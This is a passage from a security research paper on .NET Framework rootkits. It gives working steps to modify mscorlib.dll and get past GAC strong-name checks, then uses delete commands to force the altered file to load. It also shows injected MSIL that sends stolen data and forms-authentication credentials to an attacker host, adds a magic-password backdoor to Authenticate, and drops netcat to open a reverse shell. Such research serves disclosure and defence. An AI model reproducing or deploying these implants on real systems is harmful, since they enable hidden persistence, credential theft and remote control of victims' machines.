  } // end of method Console::WriteLine 
Recompile the DLL using ilasm 
Next step is to generate a new “genuine” DLL out of the modified MSIL code we 
have. 
"ilasm" is The framework's MSIL assembler that can produce .NET assemblies  
(EXE / DLL) from a given text file containing MSIL code. 
In order to generate the modified mscorlib.dll from our mscorlib.dll.il text file we'll 
execute the next command: 
ILASM /DEBUG /DLL /QUIET /OUTPUT=mscorlib.dll mscorlib.dll.il 
Now we have a new modified mscorlib.dll! 
Our next task will be to deploy it back to the GAC. 
Bypassing the GAC Strong Name model 
Following the previous step, we now have a modified mscorlib.dll. 
So what we would like to do next is to deploy it back into the framework installation 
files, so that every .NET application will use it. Here is where things get a little bit 
tricky since the framework is using a digital signature mechanism called SN (strong 
name) that gives every DLL a unique signature in order to insure assembly integrity 
and to avoid the famous "DLL hell". 
Since our modified DLL has a different signature than the original one, it will 
probably fail to be loaded by other DLL's expecting the correct signature. 
Using the supported tools such as the gacutil.exe to install back into the obviously 
GAC fails. 
At first glance, it seems like we need to attack the PKI infrastructure used (since we 
don't have the original private key used by Microsoft to sign the DLL), which means 
we need to generate a fake Microsoft private/public key pair and re-sign the whole 
framework's DLL's, but there is a shortcut for this non trivial (but still possible) 
operation.  
1st print 
2nd print 
 .NET Framework Rootkits – Backdoors Inside Your Framework
12
Surprisingly, it was found during this research that the modified DLL can be directly 
copied to the correct location at the file system, because the SN mechanism does not 
check the actual signature of a loaded DLL but just blindly loads a DLL from 
inside a directory containing the DLL signature string. 
It is important to mention that the signature bypass technique described in this paper 
is not the main issue here. The only interesting thing about it is how surprisingly easy 
it is to accomplish, but it is irrelevant to the concept of Framework level modification. 
Since an attacker who already has full control access to the machine can disable ANY 
security mechanism either way, he can always disable protection mechanism 
regardless of the implementation. 
Using windows explorer it is impossible to look at the GAC implementation at 
c:\windows\assembly, since it hides the details of the actual file system structure. 
As can be seen below, we can see the details of the mscorlib.dll, including the DLL 
version 2.0.0.0 and its signature (the public key token) - b77a5c561934e089 
So we'll directly access the GAC's file system, by using a tool such as total 
commander. 
 .NET Framework Rootkits – Backdoors Inside Your Framework
13
The structure of the directory containing the DLL is in the formation of 
VERSION_TOKEN. 
Looking at the content of this directory, we can find the original mscorlib.dll that we 
would like to overwrite. 
Upon request for this DLL from other executables running inside the framework, the 
framework will search for the required DLL based on his version and signature. The 
framework will not check for the actual signature but instead will rely on the signature 
mentioned in the directory file name. 
To put it in other words, the signature of the DLL itself is irrelevant, the only 
thing that matters is the directory in which it is located. 
 .NET Framework Rootkits – Backdoors Inside Your Framework
14
Therefore, our next step is to just overwrite the original mscorlib.dll with our own 
modified version. 
copy mscorlib.dll 
c:\WINDOWS\assembly\GAC_32\mscorlib\2.0.0.0__b77a5c561934e089\ 
Unless there's a running application using this DLL, the copy is successful without 
any complains. 
Of course, you should close all applications that use it before copying, such as 
reflector, visual studio, etc. 
In order to perform the modified DLL deployment you must have administrator level 
permissions.  
Now let's try running our demo application and see what happens. 
For some strange reason, although we replaced the DLL, there is no observed 
influence.  
Looking closer at file system access using a tool such as FileMon, we can see that the 
framework is using a different version of this DLL located at a "NativeImages" 
directory. 
It seems like there is some caching mechanism that is using a pre-compiled native 
version of the original mscorlib.dll (the old version). 
In the next section we'll discuss how to disable this mechanism and force it to load 
our modified DLL code. 
Reverting back from NGEN Native DLL 
In order to speeds things up and to avoid the JIT (just-in-time) compiler for frequently 
used DLL's, Microsoft devised a powerful mechanism called NGEN [6] that can 
compile .NET assemblies into native code. Using this mechanism, when an assembly 
is needed the framework checks whether a pre-compiled native version of it exists, 
and if so it will load it in order to skip JIT compiling. 
So although we replaced the mscorlib.dll, the framework is not using it but rather uses 
the native version stored on the cache. 
 .NET Framework Rootkits – Backdoors Inside Your Framework
15
In order to use our modified version, we will explicitly tell the framework not to use 
the native version, by issuing this command: 
ngen uninstall mscorlib 
And removing the native version of this DLL, by deleting the content of this directory 
rd /s /q c:\WINDOWS\assembly\NativeImages_v2.0.50727_32\mscorlib 
Another alternative, which will be discussed in my next paper, is to actually compile 
our modified DLL into native code, using the ngen utility and restore the original 
mscorlib.dll in order to hide traces. 
Running the test application again presents the following output: 
Success! We've managed to change the Framework! 
This was a simple proof of concept that the framework can be changed, by making 
each call to WriteLine to print the string twice. 
The rest of this paper deals with real world examples of installing rootkits and 
backdoors inside the framework, using the techniques discussed above. 
 .NET Framework Rootkits – Backdoors Inside Your Framework
16
Installing Backdoors and Rootkits 
Now that we know we can modify the framework and make it behave the way we 
want - besides doing funny things like printing the same string twice, it is possible to 
plant undetected malicious code inside the framework itself. 
The meaning of this is that we can backdoor some sensitive internal methods, which 
enables us to deploy rootkits deep into the framework. 
The malicious code will be hidden and undetected inside the Framework - code 
review will never detect them because they’re not at the application level code. 
Besides code tampering and backdoors, framework level rootkits can hide its presence 
while utilizing traditional rootkits, techniques: 
• Backdooring authentication pages 
• Creating covert channels, reverse shells, etc. 
• Hiding specific files, directories, registry keys  
• Hiding services and process injection 
• Port manipulation 
• IP spoofing and DNS record manipulation 
The rest of this chapter provides a proof-of-concept concrete implementation for some 
of the traditional rootkit techniques employed by malware code. 
Let's start with the concept of function injection for malware code reuse. 
Rootkit development - Function injection 
In order to better develop rootkits, it’s recommended to have a separation between  
 A new “ability” injected into the framework 
 The code that use it 
For example, let's say we want to have the ability to send data to the attacker, and to 
use this ability in places where we know we can steal valuable data from the 
framework (passwords, encryption keys, runtime information, etc.). 
Since a new “ability” will be used in a couple of places, why not inject it as a new 
function (.NET method)? This function will enable us to implement a new method, 
which will actually extend the .NET language by giving it new abilities. 
Those functions can live “Side by side” with other methods - they can be injected 
separately or at once without interfering with each other. 
A few examples demonstrating development of the new abilities new abilities:  let’s 
extend the framework with 2 new functions: 
 SendToUrl(string url, string data) 
 ReverseShell(string hostname, int port) 
Those functions will be used later on when we'll modify some other parts of the 
Framework.  
SendToUrl(string url, string data) 
This function will be used to transfer data from the victim machine to the attacker. 
The data transfer is implemented as an innocent http web request. 
Parameters 
 url – the attacker’s collector page 
 data – the data to send 
 .NET Framework Rootkits – Backdoors Inside Your Framework
17
Implementation of this method is as follows (in C#): 
public static void SendToUrl(string url, string data) 
{ 
    WebRequest.Create(url + data).GetResponse(); 
} 
And its MSIL representation: 
 .method public hidebysig static void  SendToUrl(string url, 
                                                  string data) cil managed 
  { 
    // Code size       20 (0x14) 
    .maxstack  8 
    IL_0000:  nop 
    IL_0001:  ldarg.0 
    IL_0002:  ldarg.1 
    IL_0003:  call       string System.String::Concat(string, 
                                                                string) 
    IL_0008:  call       class [System]System.Net.WebRequest 
[System]System.Net.WebRequest::Create(string) 
    IL_000d:  callvirt   instance class [System]System.Net.WebResponse 
[System]System.Net.WebRequest::GetResponse() 
    IL_0012:  pop 
    IL_0013:  ret 
  } // end of method Class1::SendToUrl 
The usage of this method is very simple – when we want to transfer some valuable 
data to the attacker, all we have to do is call this function. 
Suppose there is a sensitive string (“SomeSensitiveStolenData”) the attacker wants to 
send to his collector page at http://www.attacker.com/DataStealer/RecieverPage.aspx, 
which receives some data as parameter "data" and logs it somewhere. 
So we would like to call this method as  
SendToUrl("http://www.attacker.com/DataStealer/RecieverPage.aspx?data=",  
       "SomeSensitiveStolenData"); 
Suppose that we've injected the MSIL code of SendToUrl method to the System 
namespace at class Object in mscorlib.dll, so that we can reference our new method as 
System.Object::SendToUrl. 
The following injected MSIL code will call our new method: 
 .locals init (string V_0) 
    IL_0000:  ldstr      "SomeSensitiveStolenData" 
    IL_0005:  stloc.0 
    IL_0006:  ldstr      "http://www.attacker.com/DataStealer/RecieverPage.asp" 
    + "x\?data=" 
    IL_000b:  ldloc.0 
 .NET Framework Rootkits – Backdoors Inside Your Framework
18
    IL_000c:  call       void System.Object::SendToUrl(string, 
                                                               string) 
ReverseShell(string hostname, int port) 
This function will be used to provide a reverse shell to the attacker machine. 
It contains an encoded version of netcat + cmd that is deployed to disk at run time and 
executed (Inspired from the “dropandpop” [7] aspx backdoor). 
Parameters 
 hostname – the attacker’s host address 
 port – the attacker listening port  
Implementation of this function requires that ReverseShell will deploy netcat.exe + 
cmd.exe to the disk, and execute a reverse shell to the specified IP and PORT at the 
attacker machine: 
netcat IP PORT -e cmd.exe  
Code (omitted): 
.method public hidebysig static void  ReverseShell(string ip, 
                                                     int32 port) cil managed 
  { 
    // Code size       259 (0x103) 
    .maxstack  3 
       .locals init ([0] string cmdfilename, [1] string filename, [2] uint8[] netcat, 
             [3] class System.IO.BinaryWriter binWriter1,[4] uint8[] cmd, 
             [5] class System.IO.BinaryWriter binWriter2,[6] string arguments, 
             [7] class [System]System.Diagnostics.Process proc, 
             [8] object[] CS$0$0000) 
    IL_0000:  nop 
    IL_0001:  ldstr      "cmd.exe" 
    IL_0006:  stloc.0 
    IL_0007:  ldstr      "netcat.exe" 
    IL_000c:  stloc.1 
    … 
    … 
    IL_0101:  pop 
    IL_0102:  ret 
  } // end of method ::ReverseShell 
The attacker needs to run netcat locally on his machine, waiting for incoming calls at 
port 1234 for example 
nc -l -p 1234 
Calls to his specified port will be originated from the victim machine, forming a 
reverse shell tunnel 
 .NET Framework Rootkits – Backdoors Inside Your Framework
19
Using this function is very simple. The following injected MSIL code will do the job 
of making a reverse shell to ip 192.168.50.12 at port 1234 
    IL_0000:  ldstr      "192.168.50.129“  // attacker ip address 
    IL_0005:  ldc.i4     0x4d2  
// port 1234  
    IL_0006:  call       void     System.Object::ReverseShell(string,int32) 
 .NET Framework Rootkits – Backdoors Inside Your Framework
20
Practical examples 
As seen in previous sections, it is possible to modify the Framework with our own 
code, and to also add new methods to the Framework.  
This sections deals with real world practical examples, of how to modify existing 
Framework methods. This section also demonstrates the usage of the new methods 
declared above. 
Forms authentication credential stealing 
System.Web.dll contains a boolean method called Authenticate (string name, string 
password) which is used by .NET forms to authenticate users. 
Our task here is to append MSIL code to the end of this method, which will send the 
username and password to the attacker using the SendToUrl new method.  
Example: SendToUrl(“attacker.com”, name+”:”+password). 
Following the steps defined above at section "modifying the Framework core", let's 
locate the Authenticate method, and add code that calls SendToUrl to the end of this 
method. 
Now every time, in any .NET application that performs forms authentication, the 
username and password string will be send to the attacker. 
Note that this is a "post injection" technique, in which our code is injected at the end 
of the original method code. 
Backdooring forms authentication 
Another possible attack on the Authenticate function is to backdoor its logic. Let's add 
code to this method that anytime the supplied password will contain some special 
string (for example, “MagicValue!”) authentication will succeed 
Let’s add code to the beginning of Authenticate that will return true if password 
equals “MagicValue!” 
    IL_0000: ldarg.1  
    IL_0001: ldstr "MagicValue" 
    IL_0006: callvirt instance bool [mscorlib]System.String::Equals(string) 
    IL_000b: brfalse.s IL_0015 
    IL_000d: ldc.i4.1  
    IL_000e: stloc.0  
    IL_000f: br.s IL_0020 
Injected
Original code (end of 
 authenticate)
 Modified code(post injection)
 .NET Framework Rootkits – Backdoors Inside Your Framework
21
    IL_0011: ldc.i4.0  
    IL_0012: stloc.0  
    IL_0013: br.s IL_0035 
The modified code of Authenticate will be (seen as C# using Reflector, added code in 
red): 
Installing a reverse shell inside a Framework DLL 
In this example we’ll inject the ReverseShell function and execute it. 
For demonstration purpose, let’s make a reverse shell every time a winform 
executable is loaded (there's no meaning for opening a reverse shell each time like 
that, it's just easy to test and see that it works..). 
Winform applications are based on the Application class located in 
System.Windows.Forms.dll, which will be the target in this example. 
So we’ll inject code that execute our reverse shell into System.Windows.Forms.dll, at 